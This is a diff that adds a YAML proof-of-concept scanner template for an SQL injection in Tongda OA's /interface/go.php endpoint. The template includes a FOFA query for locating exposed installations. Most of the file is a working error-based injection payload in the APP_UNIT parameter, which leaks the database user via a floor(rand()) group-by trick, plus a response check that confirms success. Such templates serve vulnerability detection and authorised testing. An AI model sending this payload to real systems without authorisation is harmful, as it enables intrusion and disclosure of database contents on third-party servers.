@@ -1,0 +1,21 @@
+id: poc-yaml-tongda-interface-gophp-sqli
+info:
+  name: 通达OA /interface/go.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: office_anywhere
+  fofa: title="office anywhere 2013 网络智能办公系统"
+variables:
+  t1: random_int(1000,9999)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /interface/go.php?APP_UNIT=a%2527%20and%201=(select%201%20from(select%20count(*),concat(md5({{.t1}}),0x7c,user(),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271
+  expression: 'status_code == 200 &&
+
+    contains(body,t2)
+
+    '
+transport: http
